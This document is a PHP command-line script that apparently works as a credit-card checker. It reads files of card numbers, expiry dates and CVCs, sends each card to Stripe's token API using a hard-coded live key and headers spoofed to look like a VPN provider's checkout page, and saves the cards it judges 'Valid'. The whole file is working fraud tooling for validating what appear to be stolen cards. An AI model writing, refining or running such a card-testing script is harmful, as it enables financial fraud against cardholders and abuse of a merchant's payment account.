<?php
error_reporting(0);
parse_str(implode("&", array_slice($argv, 1)), $_GET);
$dir = $_GET["dir"];
$res = @$_GET["res"];
$arS = [];
function dropStr($str){
  $strs = str_replace(" ", "", $str);
  $strs = str_replace(" ", "", $str);
  return $strs;
}
function save($file, $cont){
  $f = fopen($file, "a");
  fwrite($f, $cont."\n");
  fclose($f);
}
function check($d){
  $cc = $d["cc"];
  $cvc = $d["cvc"];
  $date = explode("/", $d["exp"]);
  $m = $date[0];
  $tahun = $date[1];
  echo $tahun; 
  $y= substr($tahun,2);
  
  //die();
  $opt = array(
    CURLOPT_URL => "https://api.stripe.com/v1/tokens",
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => "card[number]=$cc&card[cvc]=$cvc&card[exp_month]=$m&card[exp_year]=$y&guid=2dcd7151-862b-4a71-9121-e8d98a52fc99&muid=fd18d74e-5e1b-4308-b5a4-b1d14d040224&sid=70512436-7714-4c71-a65f-d6949f89d54b&key=pk_live_pKUQzNAmMFumQBqzbE4xxQCy&pasted_fields=number&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https://www.mullvad.net/en/account/stripe",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => array(
      "Content-Type: application/x-www-form-urlencoded",
      "Origin: https://js.stripe.com",
      "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
      "Referer: https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html"
    ),
  );
  print_r($opt);
  $ch = curl_init();
  curl_setopt_array($ch, $opt);
  $result = curl_exec($ch);
  return $result;
}
if(empty($dir)){
  echo "Please input dir=dirname\n";
  exit;
}
if(empty($res)){
  echo "Please input res=resultDIR\n";
  exit;
}
if(!empty($res))touch($res);
$d = scandir($dir);

foreach($d as $file){
  if(!is_file($dir."/".$file)) continue;
  $f = fopen($dir."/".$file, "r");
  while($line = fgets($f)){
    $arrayLine = explode(' : ', $line);
    $pars = $arrayLine[0];
    $lineVal = str_replace("\n", "", $arrayLine[1]);
    $lineVal = str_replace("\r", "", $lineVal);
    if(dropStr($pars) != "CardNumber" && dropStr($pars) != "Expiration" && dropStr($pars) != "CVV/CVC") continue;
    if(dropStr($pars) == "CardNumber")$ccn = dropStr($lineVal);
    if(dropStr($pars) == "Expiration")$exp = dropStr($lineVal);
    if(dropStr($pars) == "CVV/CVC")$cvc = dropStr($lineVal);
    if(!empty($ccn) && !empty($exp) && !empty($cvc))
      $arS = array(
      "cc" => @$ccn,
      "cvc" => @$cvc,
      "exp" => @$exp
    );
  }
  $ba = check($arS);
  $js = json_decode($ba);
  if($js->card->cvc_check == "unavailable"){
    save($res."/".$arS["cc"].".txt", "CC: ".$arS["cc"]."\nCVC: ".$arS["cvc"]."\nExp: ".$arS["exp"]);
    echo "Valid -> ".$arS["cc"]." Save -> $res/{$arS["cc"]}\n";
  }
  else{
    echo "Invalid -> ".$arS["cc"]."\n";
  }
}
